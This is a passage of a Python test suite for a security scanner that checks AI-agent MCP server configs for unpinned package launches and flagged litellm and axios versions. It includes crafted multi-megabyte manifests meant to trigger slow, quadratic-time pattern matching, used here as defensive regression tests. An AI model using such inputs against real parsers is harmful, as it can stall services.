    ) == [("AAK-MCP-007", 7, _NPX_EVIDENCE), ("AAK-SUPPLY-001", 7, _NPX_EVIDENCE)]
    assert _launches(tmp_path) == [("AAK-SUPPLY-001", "medium", _NPX_EVIDENCE)]


def test_the_vscode_servers_shape_is_reported_once(tmp_path: Path) -> None:
    server = {"type": "stdio", **_NPX}
    _write(tmp_path, ".vscode/mcp.json", {"servers": {"fs": server}})
    assert _launches(tmp_path) == [("AAK-SUPPLY-001", "medium", _NPX_EVIDENCE)]
    # mcp_config reads only `mcpServers` on this branch. Its per-server check does
    # not care which map an entry came from, so build the AAK-MCP-007 finding it
    # reports for this entry and check the engine drops it beside AAK-SUPPLY-001.
    raw = (tmp_path / ".vscode" / "mcp.json").read_text()
    mcp007 = [
        f for f in placed(raw, mcp_config._check_server("fs", server, ".vscode/mcp.json"))
        if f.rule_id == "AAK-MCP-007"
    ]
    supply001 = [f for f in supply_chain.scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-001"]
    assert [f.evidence for f in mcp007] == [_NPX_EVIDENCE]
    assert _drop_launches_supply_chain_reports(mcp007 + supply001) == supply001


@pytest.mark.parametrize(("server", "supply_reason"), [
    ({"command": "uvx", "args": ["some-mcp-server>=1.0"]}, "version range `>=1.0`"),
    ({"command": "npx", "args": ["-y", "github:org/repo"]},
     "a git or URL reference without a commit"),
])
def test_the_same_launch_is_matched_whatever_reason_each_rule_gives(
    tmp_path: Path, server: dict, supply_reason: str
) -> None:
    """AAK-MCP-007 says "no version pin" for a range or a git reference too, so
    the launch is matched on the server and the spec, not on the whole evidence."""
    _write(tmp_path, ".mcp.json", {"mcpServers": {"s": server}})
    found = _launches(tmp_path)
    assert [(rule, sev) for rule, sev, _ in found] == [("AAK-SUPPLY-001", "medium")]
    assert found[0][2].endswith(f"({supply_reason})")
    assert [rule for rule, _, _ in _launches(tmp_path, rules=["AAK-MCP-007"])] == ["AAK-MCP-007"]


def test_selecting_aak_mcp_007_alone_still_reports_it(tmp_path: Path) -> None:
    _write(tmp_path, ".mcp.json", {"mcpServers": {"fs": _NPX}})
    assert _launches(tmp_path, rules=["AAK-MCP-007"]) == [("AAK-MCP-007", "low", _NPX_EVIDENCE)]


def test_excluding_aak_supply_001_brings_aak_mcp_007_back(tmp_path: Path) -> None:
    _write(tmp_path, ".mcp.json", {"mcpServers": {"fs": _NPX}})
    assert _launches(tmp_path, exclude_rules=["AAK-SUPPLY-001"]) == [
        ("AAK-MCP-007", "low", _NPX_EVIDENCE)
    ]


@pytest.mark.parametrize("how", ["--rules", "--exclude-rules", "config file"])
def test_the_cli_keeps_aak_mcp_007_when_aak_supply_001_is_not_reported(
    tmp_path: Path, how: str
) -> None:
    _write(tmp_path, ".mcp.json", {"mcpServers": {"fs": _NPX}})
    args = ["scan", str(tmp_path), "--format", "json"]
    if how == "--rules":
        args += ["--rules", "AAK-MCP-007"]
    elif how == "--exclude-rules":
        args += ["--exclude-rules", "AAK-SUPPLY-001"]
    else:
        (tmp_path / ".agent-audit-kit.yml").write_text("exclude-rules:\n  - AAK-SUPPLY-001\n")
    result = CliRunner().invoke(cli, args)
    rule_ids = {f["ruleId"] for f in json.loads(result.output)["findings"]}
    assert "AAK-MCP-007" in rule_ids and "AAK-SUPPLY-001" not in rule_ids, rule_ids


def test_an_ignored_path_takes_only_its_own_findings(tmp_path: Path) -> None:
    """AAK-SUPPLY-001 reads the root config; AAK-MCP-007 reads both. A launch is
    matched within one file, so ignoring the root does not take the other's."""
    _write(tmp_path, ".mcp.json", {"mcpServers": {"fs": _NPX}})
    _write(tmp_path, "deploy/mcp.json", {"mcpServers": {"fs": _NPX}})
    assert _launch_files(tmp_path) == [
        ("AAK-MCP-007", "deploy/mcp.json"), ("AAK-SUPPLY-001", ".mcp.json"),
    ]
    assert _launch_files(tmp_path, ignore_paths=[".mcp.json"]) == [
        ("AAK-MCP-007", "deploy/mcp.json"),
    ]
    assert _launch_files(tmp_path, ignore_paths=["deploy"]) == [("AAK-SUPPLY-001", ".mcp.json")]


def test_a_config_only_aak_mcp_007_reads_keeps_it(tmp_path: Path) -> None:
    _write(tmp_path, ".windsurf/mcp.json", {"mcpServers": {"fs": _NPX}})
    assert _launches(tmp_path) == [("AAK-MCP-007", "low", _NPX_EVIDENCE)]


def test_the_same_spec_under_another_server_is_another_launch(tmp_path: Path) -> None:
    """Server `b` passes `some-mcp-server` as an argument to a pinned package, so
    AAK-SUPPLY-001 does not report it there. Both findings name the first line that
    holds the spec, which is why the line is not what a launch is matched on."""
    _write(tmp_path, ".mcp.json", {"mcpServers": {
        "a": {"command": "npx", "args": ["-y", "some-mcp-server"]},
        "b": {"command": "npx", "args": ["-y", "other-mcp-server@1.0.0", "some-mcp-server"]},
    }})
    result = run_scan(tmp_path)
    found = sorted(
        (f.rule_id, f.line_number, f.evidence)
        for f in result.findings
        if f.rule_id in _LAUNCH_RULES
    )
    assert found == [
        ("AAK-MCP-007", 7, "Server 'b' arg: some-mcp-server (no version pin)"),
        ("AAK-SUPPLY-001", 7, "Server 'a' arg: some-mcp-server (no version pin)"),
    ]


def test_aak_mcp_007_never_gives_way_to_a_lower_severity(tmp_path: Path) -> None:
    _write(tmp_path, ".mcp.json", {"mcpServers": {"fs": _NPX}})
    mcp007 = [f for f in mcp_config.scan(tmp_path)[0] if f.rule_id == "AAK-MCP-007"]
    supply001 = [f for f in supply_chain.scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-001"]
    lowered = [dataclasses.replace(f, severity=Severity.INFO) for f in supply001]
    assert _drop_launches_supply_chain_reports(mcp007 + lowered) == mcp007 + lowered
    assert _drop_launches_supply_chain_reports(mcp007 + supply001) == supply001


def test_launch_subject_reads_back_what_launch_evidence_wrote() -> None:
    evidence = launch_evidence("it's", "pkg (beta)", "version range `^1`")
    assert launch_subject(evidence) == "Server 'it's' arg: pkg (beta)"
    assert launch_subject("Server 'a' arg: pkg") is None


@pytest.mark.parametrize(("rel", "config"), [
    (".mcp.json", {"mcpServers": {"fs": _NPX}}),
    (".vscode/mcp.json", {"servers": {"fs": {"type": "stdio", **_NPX}}}),
])
def test_fail_on_high_passes_an_unpinned_npx_launch(
    tmp_path: Path, rel: str, config: dict
) -> None:
    """`npx -y pkg` is how VS Code's docs start a server. AAK-SUPPLY-001 is MEDIUM,
    so the launch fails `--fail-on medium` and no longer fails `--fail-on high`."""
    _write(tmp_path, rel, config)
    passed = CliRunner().invoke(cli, ["scan", str(tmp_path), "--fail-on", "high"])
    assert passed.exit_code == 0, passed.output
    failed = CliRunner().invoke(cli, ["scan", str(tmp_path), "--fail-on", "medium"])
    assert failed.exit_code == 1, failed.output


@pytest.mark.parametrize(("name", "content"), [
    # No operator after the name: two `\s*` split the blank run every way.
    ("requirements.txt", "litellm" + " " * 990_000 + "x\n"),
    ("requirements.txt", "semantic-kernel" + " " * 990_000 + "x\n"),
    # Every `git+https://` in one long token read to the token's end.
    ("package-lock.json", '{"x": "' + "git+https://" * 82_000 + '"}'),
    ("package.json", '{"dependencies": {"docsgpt": "' + "git+https://" * 82_000 + '"}}'),
])
def test_a_crafted_manifest_scans_in_linear_time(tmp_path: Path, name: str, content: str) -> None:
    """About 1 MB. Before, 40,000 blanks after `litellm` took 5 seconds and
    80 KB of `git+https://` 2.7, and both grew with the square. The bound is loose for slow CI runners."""
    import time

    (tmp_path / name).write_text(content, encoding="utf-8")
    started = time.perf_counter()
    scan(tmp_path)
    assert time.perf_counter() - started < 5.0


@pytest.mark.parametrize(("requirement", "fires"), [
    ("litellm==1.83.6", True),
    ("litellm >= 1.83.6", True),
    ("litellm\t1.83.6", True),
    ("litellm==1.83.7", False),
])
def test_litellm_pin_keeps_its_version(tmp_path: Path, requirement: str, fires: bool) -> None:
    (tmp_path / "requirements.txt").write_text(requirement + "\n", encoding="utf-8")
    rule_ids = {f.rule_id for f in scan(tmp_path)[0]}
    assert any("LITELLM" in r for r in rule_ids) is fires


# ---------------------------------------------------------------------------
# AAK-SUPPLY-006 reads .vscode/mcp.json and VS Code's `servers` map
# ---------------------------------------------------------------------------

_SUPPLY_006_VSCODE = Path(__file__).parent / "fixtures" / "vscode_servers" / "supply-006"


def _supply_006(root: Path) -> list[tuple[str, str]]:
    return [(f.file_path, f.evidence) for f in scan(root)[0] if f.rule_id == "AAK-SUPPLY-006"]


def test_supply_006_reads_a_vscode_servers_map() -> None:
    [(path, evidence)] = _supply_006(_SUPPLY_006_VSCODE / "detecting")
    assert path == str(Path(".vscode") / "mcp.json")
    assert evidence.startswith("Server 'claw' uses axios@1.7.2")


def test_supply_006_passes_a_fixed_release_in_a_vscode_servers_map() -> None:
    assert _supply_006(_SUPPLY_006_VSCODE / "clean") == []


def test_supply_006_reads_both_maps_of_the_root_config(tmp_path: Path) -> None:
    config = {
        "mcpServers": {"a": {"command": "npx", "args": ["axios@1.7.3"]}},
        "servers": {"b": {"command": "npx", "args": ["axios@1.7.2"]}},
    }
    (tmp_path / ".mcp.json").write_text(json.dumps(config), encoding="utf-8")
    hits = [evidence.split(" — ")[0] for _, evidence in _supply_006(tmp_path)]
    assert hits == ["Server 'a' uses axios@1.7.3", "Server 'b' uses axios@1.7.2"]


_SUPPLY_001_CONFIGS = (".mcp.json", ".cursor/mcp.json", ".vscode/mcp.json", ".amazonq/mcp.json", "mcp.json")


@pytest.mark.parametrize("rel", _SUPPLY_001_CONFIGS)
def test_supply_006_reads_every_config_supply_001_reads(tmp_path: Path, rel: str) -> None:
    """It read .mcp.json and .vscode/mcp.json only, so the same vulnerable launch
    in Cursor's, Amazon Q's or the root mcp.json was never looked up, though
    AAK-SUPPLY-001 judged its pin in all five."""
    _write(tmp_path, rel, {"mcpServers": {"x": {"command": "npx", "args": ["-y", "axios@1.7.2"]}}})
    assert [path for path, _ in _supply_006(tmp_path)] == [str(Path(rel))]
    _write(tmp_path, rel, {"servers": {"x": {"command": "npx", "args": ["-y", "axios@1.7.4"]}}})
    assert _supply_006(tmp_path) == []


def test_supply_006_reads_a_jsonc_cursor_config(tmp_path: Path) -> None:
    (tmp_path / ".cursor").mkdir()
    (tmp_path / ".cursor" / "mcp.json").write_text(
        '{\n  // Cursor allows comments\n  "mcpServers": {"x": {"command": "npx", "args": ["axios@1.7.3",],},},\n}\n',
        encoding="utf-8",
    )
    assert [path for path, _ in _supply_006(tmp_path)] == [str(Path(".cursor") / "mcp.json")]
